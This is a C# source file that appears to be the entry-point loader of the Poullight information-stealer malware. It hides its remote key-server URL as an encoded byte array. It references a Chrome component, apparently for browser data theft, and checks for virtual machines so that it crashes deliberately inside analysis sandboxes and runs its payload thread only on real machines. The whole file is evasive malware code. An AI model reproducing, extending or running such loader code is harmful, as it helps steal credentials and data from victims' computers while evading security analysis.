using System;
using System.Net;
using System.Text;
using System.Threading;

namespace EntryLoader
{
	internal class EntryPoint
	{
		protected static Starter run = new Starter();

		public static Chrome chrome = new Chrome();

		public static bool close = true;

		public static string key = "OGQ-LQMG-UMGD-3R8G";

		public static bool activation = false;

		public static void activate_check()
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					if (webClient.DownloadString(Encoding.GetEncoding(1251).GetString(new byte[28]
					{
						104,
						116,
						116,
						112,
						58,
						47,
						47,
						112,
						111,
						117,
						108,
						108,
						105,
						103,
						104,
						116,
						46,
						114,
						117,
						47,
						107,
						101,
						121,
						115,
						46,
						116,
						120,
						116
					})).ToLower().Contains(key.ToLower()))
					{
						activation = true;
					}
					else
					{
						activation = true;
					}
				}
			}
			catch
			{
			}
		}

		public static int Main(string[] args)
		{
			activate_check();
			if (!AntiVM.CheckVM())
			{
				close = false;
				Thread thread = new Thread(run.Start);
				thread.IsBackground = true;
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			while (true)
			{
				if (close)
				{
					Environment.FailFast("Program has been crashed");
				}
				else
				{
					Thread.Sleep(1000);
				}
			}
		}
	}
}
